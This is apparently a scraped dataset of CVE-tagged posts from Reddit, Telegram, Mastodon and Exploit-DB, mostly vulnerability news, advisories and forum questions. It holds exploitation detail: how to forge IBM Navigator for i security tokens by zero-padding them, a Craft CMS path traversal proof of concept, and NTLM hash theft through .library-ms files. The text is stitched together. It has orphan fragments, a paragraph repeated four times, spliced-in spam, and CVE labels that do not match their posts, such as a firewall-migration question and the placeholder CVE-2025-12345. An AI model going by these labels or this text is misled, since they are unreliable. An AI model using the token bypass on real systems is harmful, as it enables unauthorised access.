CVE-2025-0282,2025-04-25,reddit,"New DslogdRAT Malware Targets Japan via Ivanti ICS Zero-Day Exploit Cybersecurity experts have identified DslogdRAT malware being distributed through a newly discovered zero-day vulnerability in Ivanti Connect Secure affecting organizations in Japan. Key Points: - CVE-2025-0282 is a critical vulnerability in Ivanti ICS that allowed for remote code execution. - DslogdRAT is being used alongside other malware in targeted espionage campaigns in Japan. - The exploitation of this flaw has led to a significant increase in malicious scanning activity against ICS appliances. Recently, cybersecurity researchers have raised alarms about the emergence of DslogdRAT malware, which is being deployed through a critical security flaw identified as CVE-2025-0282 in Ivanti Connect Secure. This vulnerability allowed unauthorized users to execute remote code, leading to the installation of malware and a Perl web shell within targeted systems, primarily affecting organizations in Japan in late 2024. The flaw was promptly addressed by Ivanti in January 2025, but the window of opportunity for attackers had already been exploited by cyber espionage groups, particularly a group known as UNC5337. DslogdRAT establishes communication with an external server, enabling it to send system information and execute arbitrary commands. This malware is part of a wider exploitation tactic, which has also seen other malware strains such as SPAWN being deployed. Reports indicate a surge in reconnaissance activities targeting Ivanti appliances, with suspicious scanning from over 1,000 unique IP addresses in the last 90 days, potentially indicating preparations for future attacks. The implications are severe as these attacks not only threaten the confidentiality of sensitive information but also pose a risk to the integrity of critical infrastructure in affected regions.

CVE-2022-2390,2025-04-26,reddit,"Un jailbreak in arrivo sul firmware 11.x della console PlayStation 4 Best curtains shop in Dubai Un jailbreak in arrivo sul firmware 11.x della console PlayStation 4 <URL> recente exploit condiviso da zecoxao ha portato rapidamente ad una nuova vulnerabilità sulla gestione dei salvataggi di gioco per la console PlayStation 4, una tecnica già utilizzata in passato per violare altre console, come la PSP o la Wii.\ La vulnerabilità consente di eseguire codice non autorizzato, un primo passo fondamentale per aggirare le protezioni di sicurezza di Sony. Anche se per il momento non si tratta ancora di un jailbreak completo.\ Al momento, l’exploit permette di eseguire codice limitato sulla PlayStation 4, come script in Lua, un linguaggio di programmazione leggero.\ Questo potrebbe aprire la porta a funzionalità come l’esecuzione di homebrew o, potenzialmente, l’avvio di giochi PS2 tramite emulatori. Tuttavia, non è ancora chiaro se l’exploit sia in grado di supportare l’esecuzione di backup di giochi PS4 in modo stabile.\ Rispetto a exploit precedenti, questa vulnerabilità sembra promettente, ma non è priva di limitazioni. La tecnica basata sui salvataggi di gioco è stata utilizzata con successo su altre console, ma sulla PlayStation 4 non ha mai portato a un jailbreak completo.\ Intanto gli sviluppatori stanno lavorando per capire se questa scoperta possa evolversi in una soluzione più avanzata.\ A differenza di exploit precedenti, questa tecnica si basa su un errore di tipo double free nella funzione AIO del sistema operativo FreeBSD, che è alla base delle due console PlayStation 4 e PlayStation 5.\ La vulnerabilità, correlata al CVE-2022-2390, riguarda i firmware della console PlayStation 4 dalla versione 5.0 fino alla 12.02, mentre è stata corretta nel firmware 12.50.\ Per console PlayStation 5, l’exploit potrebbe funzionare fino alla versione 10.60, anche se non è ancora stato confermato con certezza se sia stato risolto nel firmware 11.0.\ Un utente anonimo ha condiviso successivamente alcuni dump del kernel che hanno confermato la correzione della vulnerabilità nei firmware più recenti.\ In seguito, il codice della patch è stato reso pubblico, e altri sviluppatori hanno confermato la validità della scoperta sui firmware precedenti.\ \ Stato attuale del jailbreak\ Sulla PlayStation 4, i metodi attualmente disponibili includono:\ \ \ Jailbreak 9.0, basato su exploit WebKit ed exFAT, richiede una chiavetta USB e funziona solo fino al firmware 9.0.\ Exploit PPPwn, rilasciato nel 2023, supporta firmware fino alla verisione 11.0 ma necessita di un dispositivo esterno per inviare il payload.\ \ Questa nuova vulnerabilità potrebbe consentire un jailbreak completamente eseguibile via browser fino al firmware 9.60, eliminando la necessità di dispositivi esterni.\ Per firmware superiori , potrebbe essere sfruttata tramite l’exploit Lua, che però richiede un raro gioco giapponese e un salvataggio modificato, rendendolo poco accessibile.\ Sulla PlayStation 5, la situazione appare più frammentata:\ \ \ L’exploit UMTX permette un jailbreak parziale fino al firmware 5.50 tramite browser, e fino al 7.61 utilizzando Blu-ray o Lua.\ Se confermata, la nuova vulnerabilità potrebbe estendere il jailbreak fino al firmware 10.60, potenzialmente abbinabile ad altri exploit kernel già noti . Tuttavia, l’assenza di un exploit hypervisor limita la possibilità di ottenere un jailbreak completo.\ \ Pare che la console PlayStation 4 possa beneficiare prima dei frutti di questa scoperta, grazie a una base più solida di exploit esistenti.\ Sulla PlayStation 5 invece, la mancanza di un exploit dell'hypervisor e le possibili misure anti-Kstuff nei firmware più recenti rappresentano ostacoli significativi.\ Fonte: x.comDiscover the best curtains shop in Dubai, where style meets quality and customization.

CVE-2025-32433,2025-04-26,reddit,"Top 10 Trending CVEs Here’s a quick breakdown of the 10 most interesting vulnerabilities trending today: 1. CVE-2025-43865 - React Router is a router for React. In versions on the 7.0 branch prior to version 7.5.2, its possible to modify pre-rendered data by adding a header to the request.

Prior to versions 2.2.13, 3.0.14, and 3.1.12, Rack::Static can serve files under the specified root: even if urls: are provided, which may expose other files under the specified root: unexpectedly. The vulnerability occurs because Rack::Static does not properly sanitize user-supplied paths before serving files. Specifically, encoded path traversal sequences are not correctly validated, allowing attackers to access files outside the designated static file directory. By exploiting this vulnerability, an attacker can gain access to all files under the specified root: directory, provided they are able to determine then path of the file. Versions 2.2.13, 3.0.14, and 3.1.12 contain a patch for the issue. Other mitigations include removing usage of Rack::Static, or ensuring that root: points at a directory path which only contains files which should be accessed publicly. It is likely that a CDN or similar static file server would also mitigate the issue. - Published: 10/03/2025 - CVSS: 7.5 - Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N - Mentions: 6 - Priority: 2 - 4.

Prior to versions 2.2.13, 3.0.14, and 3.1.12, Rack::Static can serve files under the specified root: even if urls: are provided, which may expose other files under the specified root: unexpectedly. The vulnerability occurs because Rack::Static does not properly sanitize user-supplied paths before serving files. Specifically, encoded path traversal sequences are not correctly validated, allowing attackers to access files outside the designated static file directory. By exploiting this vulnerability, an attacker can gain access to all files under the specified root: directory, provided they are able to determine then path of the file. Versions 2.2.13, 3.0.14, and 3.1.12 contain a patch for the issue. Other mitigations include removing usage of Rack::Static, or ensuring that root: points at a directory path which only contains files which should be accessed publicly. It is likely that a CDN or similar static file server would also mitigate the issue. - Published: 10/03/2025 - CVSS: 7.5 - Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N - Mentions: 6 - Priority: 2 - 4.

Specifically, encoded path traversal sequences are not correctly validated, allowing attackers to access files outside the designated static file directory. By exploiting this vulnerability, an attacker can gain access to all files under the specified root: directory, provided they are able to determine then path of the file. Versions 2.2.13, 3.0.14, and 3.1.12 contain a patch for the issue.

Prior to versions 2.2.13, 3.0.14, and 3.1.12, Rack::Static can serve files under the specified root: even if urls: are provided, which may expose other files under the specified root: unexpectedly. The vulnerability occurs because Rack::Static does not properly sanitize user-supplied paths before serving files. Specifically, encoded path traversal sequences are not correctly validated, allowing attackers to access files outside the designated static file directory. By exploiting this vulnerability, an attacker can gain access to all files under the specified root: directory, provided they are able to determine then path of the file. Versions 2.2.13, 3.0.14, and 3.1.12 contain a patch for the issue. Other mitigations include removing usage of Rack::Static, or ensuring that root: points at a directory path which only contains files which should be accessed publicly.

CVE-2025-27610 - Rack provides an interface for developing web applications in Ruby. Prior to versions 2.2.13, 3.0.14, and 3.1.12, Rack::Static can serve files under the specified root: even if urls: are provided, which may expose other files under the specified root: unexpectedly. The vulnerability occurs because Rack::Static does not properly sanitize user-supplied paths before serving files. Specifically, encoded path traversal sequences are not correctly validated, allowing attackers to access files outside the designated static file directory. By exploiting this vulnerability, an attacker can gain access to all files under the specified root: directory, provided they are able to determine then path of the file. Versions 2.2.13, 3.0.14, and 3.1.12 contain a patch for the issue. Other mitigations include removing usage of Rack::Static, or ensuring that root: points at a directory path which only contains files which should be accessed publicly. It is likely that a CDN or similar static file server would also mitigate the issue. - Published: 10/03/2025 - CVSS: 7.5 - Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N - Mentions: 6 - Priority: 2 - 5.

CVE-2024-21762,2025-04-27,reddit,"FINAL FIREWALL MIGRATION PLAN Hello All, TLDR at the bottom. This is the first time I've undertaken a firewall migration project like this so to say I'm experiencing nervousness/imposter syndrome would be an understatement . so any encouragement, feedback or hard truths are greatly appreciated. That said, in preparation for a firewall migration I've been working on manually building this firewall config for a while now in Eve-NG and so far everything is working the way it should . I think I'm just about done wrapping it up as we're nearing our deployment date so I wanted to see if there were any holes in my plan . As you can see in the diagram we're migrating 3 Cisco ASAs to a single 400 series Fortigate . The main reason for the migration is to upgrade speeds from 2G to 10G and to modernize our equipment. After lots of research and thought I've decided to ditch the idea of VDOM/Virtual Interfaces and take the path of moving all of the interfaces from the ASAs to the Fortigate with the exception of the outside interfaces on the ""Guest"" and ""Ad Hoc"" firewalls . I'll also be using Central SNAT and rather than using IPSec as we did on the ASAs I'll be using SSL VPN due to time and my inability to get IPsec working right . So my configuration pretty much involves copying/consolidating the following configs from the Cisco ASAs over to the Fortigate: Interfaces: minus the two outside interfaces on the ""Guest"" and ""Ad Hoc"" firewalls Zones: each interface gets it's own zone Routing: each interface is a gateway except for two inside and one outside interface which are P2P and carry multiple subnets SNAT/DNAT Addresses/Groups, Services/Groups, IP Pools Firewall Policies: the only catch I had with this is the connection between the ""Ad Hoc"" firewall and the ""Corporate"" firewall as there were overlapping rules and the complication of ""Any"" rules. being that traffic to and from the ""Ad Hoc"" firewall basically has the potential to get filtered through 3 ACLs before getting out the door. VPN: SSL VPN with a cert from a trusted CA on the outside and a cert from a local CA on the inside for LDAPS The only changes I think I'll have to make on other network devices are moving the two 1Gb interface configs to a single 10Gb interface , rerouting public IPs pointed to the P2P outside interface of the ""Guest"" firewall to the main WAN interface and configuring the 10Gb interfaces on our core switch for the firewall interfaces. I'm preparing for the likelihood that issues will arise . TLDR: How bullet proof is my plan ? Given my situation how have you other network admins/engineers handled your first major project like this ? How conservative should I be with logging/features ? where would you recommend placing such features/logging ? What steps did you take during migration for deployment and assessment tests ? I know I'm probably overthinking this and I also understand that not only is there no such thing as a ""one size fits all"" method but there's also no such thing as a perfectly secure network. The way I've gone about this configuration is due to management giving me a deadline that I think I've finally pushed to it's limit. So I just need to get everything up and functioning to the best of my ability without introducing new vulnerabilities . FYI our environment isn't mission critical/can afford downtime, only exposes VPN as well as a small handful of servers to the internet and we only have maybe 750 - 1000 devices between staff and guests connected at any given time.

CVE-2022-24761,2025-04-22,telegram,"CVE-2022-24761 Description: Waitress is a Web Server Gateway Interface server for Python 2 and 3. When using Waitress versions 2.1.0 and prior behind a proxy that does not properly validate the incoming HTTP request matches the RFC7230 standard, Waitress and the frontend proxy may disagree on where one request starts and where it ends. This would allow requests to be smuggled via the front-end proxy to waitress and later behavior. There are two classes of vulnerability that may lead to request smuggling that are addressed by this advisory: The use of Python's `int` to parse strings into integers, leading to ` 10` to be parsed as `10`, or `0x01` to be parsed as `1`, where as the standard specifies that the string should contain only digits or hex digits; and Waitress does not support chunk extensions, however it was discarding them without validating that they did not contain illegal characters. This vulnerability has been patched in Waitress 2.1.1. A workaround is available. When deploying a proxy in front of waitress, turning on any and all functionality to make sure that the request matches the RFC7230 standard. Certain proxy servers may not have this functionality though and users are encouraged to upgrade to the latest version of waitress instead. Link:",0.00197,7.5

When Windows File Explorer detects a .library-ms file in a folder, it automatically starts parsing it. If the file contains a link to a remote SMB share, an NTLM authentication handshake begins. An attacker controlling the SMB share can intercept the NTLMv2 hash, crack it, or use it in pass-the-hash attacks. But how does an attacker deliver such a file to the victim? It turns out that just extracting a ZIP/RAR archive with the file is enough to trigger the exploit. No need to open the file. This is super effective for phishing.

CVE-2024-40711,2025-04-22,telegram,"watchTowr Labs ( to some oddities with the fix for the Remote Code Execution - Veeam Backup & Replication vulnerability (( The description of the vulnerability in NVD tells us that authentication is not required to exploit the vulnerability, but the CVSS vector in the vendor bulletin indicates that authentication is required . The large number of changes in the patch hints that the vendor fixed some vulnerabilities without informing customers . The researchers concluded that CVE-2024-40711 was fixed in several stages. At first, exploitation of the vulnerability did not require authentication, then a patch was released and exploitation began to require authentication, and finally, the second patch completely fixed this vulnerability. Exploitation of the vulnerability allows an attacker to destroy backups and significantly complicate the restoration of the organization's infrastructure. ( #Veeam #watchTowrLabs",0.49658,9.8

A similar malicious program with a high degree of probability will not be able to identify standard security functions, such as Intel Boot Guard or Virtualization-Based Security, and all existing antiviruses. For the time being, remaining unnoticed, the malicious code can start sending users to attackers, block access to the device, delete and encrypt the data of carriers and perform other dangerous actions, ”explained Mark Ermolov. Scenario number two - bypassing copyright protection tools for access to the protected content of streaming services. The same methodology for compromising can be used to bypass the mechanisms of protection and copying data in some models of Amazon electronic books, which uses vulnerable Intel Atom processors. The third opportunity that the discovered vector gives is access to data on encrypted media. Such attacks can be used for stealing a laptop or tablet based on these processors. Intel was notified as part of a responsible disclosure policy, but did not recognize the described problem and refused to take measures to eliminate or reduce the level of threat. To protect yourself, we advise you to check the technical characteristics of the devices that you use. If their processors are potentially vulnerable, be more careful, for example, when repairing, where an attacker can get access to them. #Positivexperts #PTSWARM",0.0011,7.8

CVE-2025-2783,2025-04-28,reddit,"Built a threat search engine for cybersecurity investigations — Would love your feedback! Hey everyone, I recently launched a project I’ve been working on: xdscvr.com! It’s a threat search engine that searches the web and provides a summary for each result, contextually based on your query. Here are some example use cases: • Is there a known public exploit for CVE-2025-2783? • Has the vendor released a patch or workaround for CVE-2025-2783? • Threat actor groups associated with Akira ransomware • MITRE ATT&CK mapping for the Akira threat I built it because I wanted a faster way to gather threat intel without opening 10+ tabs every time. I’m still developing and enhancing it, and I highly value your feedback: > Would you use it? > What features would you want added? > Any ways to make it better before turning it into a full product?

CVE-2024-36347,2025-04-28,reddit,"Should I update my BIOS? Hi everyone! In early 2023 I built a PC from scratch by buying all the parts from Amazon/other sellers. My current setup is: - Gigabyte B650 Aorus Elite AX - Ryzen 5 7600 - AMD RX 6750XT - 2x 16 GB Corsair RAM 6000 MHz . The setup was smooth, everything is working fine. Let's say I'm good at following instructions. My only issue right now is that the PC takes a little bit to boot up, more than a minute. It's not a big deal, but feels like a lot more than it would take for a modern pc running SSD. Back then I read that it was due to the early bios build. Fast forward today, I somehow thought ""should I update the BIOS?"" I checked and it appears I have F1 version, released on 26/8/2022. That version is no longer even listed on the official Gigabyte download page. Should I update it? I'm not an expert, but I'm not even a complete newbie. Just to provide background I've got a MSc Degree in Computer Science Engineering and currently working in IT field. But I've never flashed a BIOS, I'm more a software guy than a hardware one, I've never worked on very low-level stuff. I've read online that the operation is recommended only if strictly required, but I've also read that it's an old thing and nowadays it's a safer operation. Also I've seen that the various BIOS versions cover at least three major security updates . And also implement a voltage limit on the CPU recommended by AMD. What would you do?",,

CVE-2025-24200,2025-05-02,reddit,"Stolen 2019 MacBook Pro – Find My “Erase Pending” but thieves reinstalled Catalina and are on the desktop. How did they bypass Activation Lock & what data did they get? So here's the situation. My 2019 16-inch Intel MacBook Pro and 2017 iPad Pro were stolen a few days ago from a cafe. As soon as I realized, I logged into iCloud and triggered both “Erase Device” and “Mark As Lost” via Find My — this was within 10 minutes of the theft. The devices showed up shortly after in a place in my city that’s notorious for being where all stolen electronics go — like a central market for used parts, stolen electronics, jailbroken devices, etc. Two days later, I managed to get someone with a “connection” inside that place to send me a photo of the Mac. And here’s the crazy part: it was booted up, on the macOS Catalina 10.15.7 desktop. They even sent me the About This Mac screen showing my exact serial number — no doubt it’s mine. But the OS is downgraded from Ventura 13.6.1 to Catalina. I can’t see the user folders or whether my desktop files are there — they only sent me the About screen — but no information in the desktop items. Meanwhile, Find My still shows the Mac as “Erase Pending”, which suggests it hasn’t gone online since the theft — or if it has, it’s on a filtered network. I’m not sure if I had FileVault enabled. I think not. No firmware or startup password either, but my only User did have a 24 digit password. Find My was enabled, and I’ve always had 2FA on my Apple ID. So… how did they pull this off? What I think they did Booted into Recovery Mode . No password needed. Opened Disk Utility and wiped the internal drive. Reinstalled Catalina . Never connected to Wi-Fi, or they blocked Apple activation servers . During Setup Assistant, since there’s no connection, macOS never checks with Apple’s servers, so Activation Lock doesn’t kick in. They create a new admin user and boot to the desktop. And now… they're just sitting on a Catalina machine, not sure if they managed to get online or not, but I would guess so, as they sell these stolen devices. They’re known in that area for selling “unlocked” Macs, so I’m wondering if they did something more advanced — maybe some Activation Lock bypass or hardware trick? Questions I’m hoping someone here can help with: 1. Does this flow sound technically correct? Is it really this “easy” if FileVault was off and Recovery Mode isn’t locked down? 2. Is it likely they accessed my data before wiping? Could they have just reset the password via Recovery or deleted .AppleSetupDone to make a new admin and snoop around before erasing? 3. Are there real-world ways to actually kill Activation Lock on T2 Macs? Like logic board swaps, or any of those gray-market “checkm8-T2” tools? 4. Anything else I should be doing now? I've left the device in iCloud with Erase Pending, and I've rotated every important password and token I can think of. Stuff I’ve been reading that might be relevant The usual resetpassword trick in Recovery works fine if FileVault’s off. You can reset or create users with no Apple ID needed. There was CVE-2025-24200 — a USB restricted mode bypass — but it doesn’t seem needed here since FileVault was off. The old “reset NVRAM to disable Find My” trick doesn’t apply anymore — Apple patched that years ago . I’ve read rumors about checkm8-based tools unlocking T2 Macs, but haven’t seen credible confirmation that it works post-erase and online. I’m trying to fully understand the actual limitations of Activation Lock and Find My in practice — especially when FileVault isn’t on. Apple implies “your data is safe,” but this sure feels like it’s not unless encryption is on too. Happy to answer anything that helps figure this out. I appreciate any insight — whether you've seen this before or have deeper technical knowledge about how Apple’s activation flow works. Thanks. TL;DR: My 2019 MacBook Pro was stolen. Find My shows ""Erase Pending"", but someone sent me a pic of it booted into Catalina, logged into a new user . How did they downgrade, erase, and get to the desktop without triggering Activation Lock? FileVault was likely off.

CVE-2025-32433,2025-04-18,mastodon,"Whoa, heads up cybersecurity folks! There's a particularly nasty bug making the rounds: CVE-2025-32433 in Erlang/OTP SSH. And yes, it scored a perfect CVSS 10.0 . We're talking potential unauthorized remote code execution here. Basically, an attacker can sneak SSH messages through before any authentication even happens. Think about that for a second. If your SSH daemon happens to be running as root. well, that's pretty much game over for the system. This isn't just a minor issue; it impacts anyone using the Erlang/OTP SSH implementation. The good news? Patches are available! You'll want to update to one of these versions ASAP: OTP-27.3.3 OTP-26.2.5.11 OTP-25.3.2.20 Speaking as a pentester, gotta say, that's a clever vulnerability path . Another thing to keep in mind: your typical automated vulnerability scanners might completely miss this one due to the pre-auth nature. So, what's your take? Have any of you run into this yet or started testing for it? Curious to know what tools you're finding effective for detection or exploitation testing!

CVE-2025-12345,2025-04-16,mastodon,"The CVE program loses financing-the Mitre Corporation digital global security, the non-profit organization responsible for the Common Vulnerabilies and Exposures program, confirmed that the contract for its development, service and modernization expires on April 16, 2025, today, today. The CVE program, which is a global standard for identifying and tracking publicly disclosed gaps in software security, is used by companies such as Microsoft, Google, Apple, Intel or AMD. Lack of further financing may threaten its functioning. Mitre received funds for the CVE program from the US National Security Department and the Infrastructure Cyber security and security agency . Yosry Barsoum, vice president of Mitre, said that the organization remains involved in maintaining the program as a global resource, and the US government makes efforts to support its role. However, the expiry of the contract, which was the first to inform the letter leakage to members of the CVE board published on X and BlueSky platforms, raises concerns about the future of the program. And that we would be aware of the seriousness of the situation: CVE, i.e. Common Vulnerabilies and Exposures, is an international system for identifying, cataloging and public disclosure of gaps in software security and IT systems. Its purpose is to ensure a standard way to describe and track susceptibility, which enables companies, researchers and specialists in cyber security to quickly recognize threats, assess their seriousness and prioritize repair activities. The program is managed by Mitre Corporation, a non-profit organization, with financial support, among others, the US National Security Department . Each gap reported under the program receives a unique CVE identifier in the ""CVE-ROK-NUMER"" format , which allows it to be clearly identified in global databases. CVE records contain a description of vulnerability, its potential impact and, as far as possible, reference to corrections or remedies. The system is used by the largest technology companies such as Microsoft, Google, Apple, Intel and AMD, as well as government organizations and independent researchers. Do you understand what this database means due to lack of financing? The Cve program is about to go dark. Mitre just confirmed their funding to run cve and cwe expires tomorrow. That’s the main database the world relies on to track know vulnerabites in software. Yes, The Cve. The backbone of the entire vuln ecosystem. No cves = no shared . pic.twitter.com/4bwcpxia1v - Feross April 15, 2025 Although Mitre's historical CVE records will remain available on the GitHub website, but this is also another suggestion that in the absence of new financing, new Luka may not be cataloged. Over 400 organizations such as Google, Apple or Microsoft are involved in the work on CVE, which play the role of CVE Numbering Authorities and issue CVE identifiers, which can partly alleviate the effects of lack of financing. Details of potential new sources of financing or impact on current program operations have not been given, but the situation is monitored by the cyber security community. It is very possible that this movement of the American administration is aimed at forcing financing the issue of cyber security by entities that should be most interested in the reliability of their own solutions, i.e. large, technological players. However, there is also a minus of this approach: selected companies may not be interested in publishing information on gaps in their own solutions, which in effect degrade global security. The existing gap base implemented as part of the CVE program was a benefit for users of IT solutions as well as for producers. Lack of financing the CVE program can disturb this order. One thing is certain: any disorders in cybersecurity infrastructure are delighted with cybercriminals.",,

You need skilled people, actual human intelligence, digging into your systems to find what scanners miss. What have you all been seeing out there?

CVE-2024-4040,2025-04-08,mastodon,"Just another Monday in IT, right? Dealing with CrushFTP, the CISA KEV list, and active exploits. So, let's talk about CVE-2024-4040 . It’s a tricky authentication bypass vulnerability. While that might sound a bit technical, the bottom line is it's seriously critical. Why? Because unauthenticated attackers could potentially log in as any user and basically hijack the entire system. Yikes. Now, CISA has flagged this one, adding it to their Known Exploited Vulnerabilities list. Their advice? Get patching done by April 28th! You know, this probably impacts quite a few places that might not even have it on their radar yet. Why am I even posting about this? Well, because relying solely on automated scans often isn't enough – they can miss things like this. This is exactly the kind of vulnerability that thorough pentesting is designed to uncover. Plus, let's be honest, your clients will thank you big time for spotting and fixing these issues before things go boom. Here’s a quick action plan: Get those systems updated ASAP! Give your setups a thorough check. Time for a password reset on affected accounts. Make sure you've got 2FA turned on wherever possible. Keep a close watch on your network activity. Over to you: What are your go-to tools for hunting down vulnerabilities like this one? Drop your thoughts below! ,infosec ,pentesting ,CISA ,cybersecurity ,CrushFTP ,CVE",0.94274,9.8

CVE-2024-12797,2025-02-11,mastodon,"An impact summary has now been added to the openssl website: Impact summary: TLS and DTLS connections using raw public keys may be vulnerable to man-in-middle attacks when server authentication failure is not detected by clients. RPKs are disabled by default in both TLS clients and TLS servers. The issue only arises when TLS clients explicitly enable RPK use by the server, and the server, likewise, enables sending of an RPK instead of an X.509 certificate chain. The affected clients are those that then rely on the handshake to fail when the server’s RPK fails to match one of the expected public keys, by setting the verification mode to SSLVERIFYPEER. Clients that enable server-side raw public keys can still find out that raw public key verification failed by calling SSLgetverifyresult, and those that do, and take appropriate action, are not affected. This issue was introduced in the initial implementation of RPK support in OpenSSL 3.2. The FIPS modules in 3.4, 3.3, 3.2, 3.1 and 3.0 are not affected by this issue. <URL> rabilities/index.html-2024-12797 ,openssl ,threatintel ,vuln ,cve ,cve202412797 ,rfc7250",,6.3

CVE-2024-56161,2025-02-07,mastodon,"У тех же VLIW-процессоров типа «Эльбрус» нет загружаемого микрокода, а потому и неожиданностей гораздо меньше . Вот множество примеров того, что именно прячется в некорректной работе с микрокодом. Это только самые громкие и за последние пару лет. Исследователи безопасности из компании Google опубликовали информацию об уязвимости в процессорах AMD, затрагивающей загрузчик микрокода и позволяющей обойти механизм проверки цифровой подписи при обновлении микрокода. Загрузка модифицированного микрокода позволяет скомпрометировать механизм AMD , применяемый в системах виртуализации для защиты виртуальных машин от вмешательства со стороны гипервизора или администратора хост-системы. Уязвимость вызвана использованием небезопасной хэш-функции в коде, выполняющем проверку цифровой подписи после загрузки микрокода в CPU. Для совершения атаки необходимо наличие прав администратора в локальной системе .

CVE-2022-23824,2025-02-07,mastodon,"У тех же VLIW-процессоров типа «Эльбрус» нет загружаемого микрокода, а потому и неожиданностей гораздо меньше . Вот множество примеров того, что именно прячется в некорректной работе с микрокодом. Это только самые громкие и за последние пару лет. Исследователи безопасности из компании Google опубликовали информацию об уязвимости в процессорах AMD, затрагивающей загрузчик микрокода и позволяющей обойти механизм проверки цифровой подписи при обновлении микрокода. Загрузка модифицированного микрокода позволяет скомпрометировать механизм AMD , применяемый в системах виртуализации для защиты виртуальных машин от вмешательства со стороны гипервизора или администратора хост-системы. Уязвимость вызвана использованием небезопасной хэш-функции в коде, выполняющем проверку цифровой подписи после загрузки микрокода в CPU. Для совершения атаки необходимо наличие прав администратора в локальной системе . В ходе атаки можно вклиниться в работу гостевых систем, защищённых при помощи расширений AMD SEV и SEV-SNP , предоставляющих гарантии целостности памяти виртуальных машин, изолирующих процессорные регистры и обеспечивающих безопасную работу со вложенными таблицами страниц памяти.

CVE-2024-49147,2024-12-13,mastodon,"Apparently I am getting one more ,CVE this year, and this one is kind of cool :) Earlier this year, I found a critical vulnerability in the Microsoft Update Catalog . This is the site where you go to download individual update packages for Microsoft products. I ,redteam for ,microsoft and I pulled off that exploit as part of my normal work. Previously Microsoft hasn't issued CVE's for service vulnerabilities, but now as part of the expanded Secure Future Initiative, critical vulnerabilities in Microsoft service get CVE's. I think 9.3/8.4 is the highest CVSS I've ever gotten. This is a ""no action"" CVE, because there's nothing for you do to make yourself safer. Microsoft already patched the service. I don't know if I can say more about the exploit than what's in the official disclosure. You can read that here: <URL> e/vulnerability/CVE-2024-49147 ,cve202449147",0.00043,9.3

CVE-2024-37285,2024-09-06,mastodon,"Critical Kibana Vulnerability - Arbitrary Code Execution via YAML Deserialization Date : September 5, 2024 CVE : CVE-2024-37285 Vulnerability Type : Deserialization of Untrusted Data CWE : ] Sources : Elastic Security Advisory Synopsis CVE-2024-37285 impacts Kibana versions 8.10.0 to 8.15.0, where a deserialization flaw allows remote code execution if an attacker injects malicious YAML payloads. This vulnerability requires that an attacker has elevated Elasticsearch and Kibana privileges. Issue Summary The vulnerability arises from improper YAML deserialization within Kibana. A malicious actor can craft a YAML payload and execute arbitrary code, provided they have specific Elasticsearch index and Kibana privileges. This issue affects Kibana from versions 8.10.0 through 8.15.0 and is critical due to its ease of exploitation and the potential for widespread impact. Technical Key Findings Attackers exploit this flaw by submitting a specially crafted YAML document that Kibana deserializes without proper validation. Once the malicious code is parsed, it can run on the server with elevated privileges, enabling arbitrary code execution. The attacker must have the following Elasticsearch indices permissions; write access to system indices .kibanaingest The allowrestrictedindices flag needs to be set to true The attacker must also have ANY of the following Kibana privileges; Under Fleet the All privilege is granted Under Integration the Read or All privilege is granted Access to the fleet-setup privilege is gained through the Fleet Server’s service account token#,Vulnerable Products Kibana versions 8.10.0 to 8.15.0. Impact Assessment Successful exploitation could allow an attacker to execute arbitrary commands, leading to a complete system compromise. This could affect confidentiality, integrity, and availability, making it a high-risk issue for organizations relying on Kibana for data visualization and exploration. Patches or Workaround Upgrading to Kibana version 8.15.1 resolves this vulnerability. Additionally, limiting access to Elasticsearch indices and restricting Kibana privileges reduces exposure.

Vulnerability overview/description: 1) Authenticated Path Traversal The plugin ""Logs"" provides a functionality to read log files of the Craft CMS system inside the backend of the CMS. As the requested logfile is not properly validated, an attacker is able to request arbitrary files from the underlying file system with the permissions of the web service user. Proof of concept: 1) Authenticated Path Traversal As the plugin is installed as an administrator of the system and the function is only accessible after being logged in as an admin, an attacker needs to be authenticated as an administrator in the backend in order to extract the needed ""{MD5}identity"" cookie for the crafted request. The vulnerable endpoint is provided by the plugin under the following path: <URL> The vulnerable controller for that endpoint can be found here: <URL> The function ""actionStream"" provides an endpoint for the Craft CMS and does not validate input values before file content is being read by the function ""filegetcontents"". public function actionStream $logsDir = \Craft::getAlias; $logFile = \Craft::$app->request->getParam; $currentLog = \Craft::$app->request->get; $log = filegetcontents; exit; A crafted GET parameter with the name ""log"" can be used to access files on the underlying filesystem with rights as the user executing the web server. In most cases this will be the user ""www-data"".

CVE-2024-51464,2025-04-15,exploitdb,"Author Title: John Page Author Website: hyp3rlinx.altervista.org Source: <URL> Vendor: <URL> Navigator for i is a Web console interface where you can perform the key tasks to administer your IBM i. IBM Navigator for i supports the vast majority of tasks that were available in the System i Navigator Windows client application. This Web application is part of the base IBM i operating system, and can be easily accessed from your web browser. HTTP Security Token Bypass CVE-2024-51464 IBM i is vulnerable to bypassing Navigator for i interface restrictions. By sending a specially crafted request, an authenticated attacker could exploit this vulnerability to remotely perform operations that the user is not allowed to perform when using Navigator for i. The web application generates an HTTP security token ID called ""Mn:"" with a 19 digit value and is set in the HTTP session response header per user. Navigator, uses this token for integrity purpose to protect against arbitrary and or malicious HTTP requests. Therefore, upon receipt of a bogus security token in an HTTP request the server will respond with HTTP 403 Forbidden message. However, attackers can modify existing tokens to bypass the 403 Forbidden directive to achieve their objectives. Problem is Navigator security token logic does not properly create or detect if a security token is valid or if it has been tampered with. Attackers can manipulate the last eight digits of a token by setting them to all 0000s and or increment them by one, token length must be the same. This can trick the application into processing attacker controlled security tokens as the server thinks it is valid, this undermines the security of this protection. E.g. Valid HTTP header generated by the server. Mn: 6844795211344371559 Content-Length: 290 Origin: <URL> Example of a bogus but honored MN header token set by an attacker, padded with zeros and happily accepted by the backend servlet. Mn: 6844795211300000000 The MN token is generated in the ""initProtectionSetting"" java method. public void initProtectionSetting { initEncryption; initSession; setMagicNumber; response.setHeader; setUserAgent); In the Method we see the check for MN header which sends HTTP 403 on invalid tokens. String mnStr = hRequest.getHeader; if mnStr = hRequest.getParameter; if ) { NavLogger.severe; NavLogger.info; hResponse.sendError; return; Invalid token response will return: Error 403: SRVE38895F: Error reported: 403 Attacker increments MN or pad with zeros and requests are accepted and the token succeeds. HTTP 200 OK ADV0142855 <URL> IBM classified as ""CWE-644: Improper Neutralization of HTTP Headers for Scripting Syntax"".

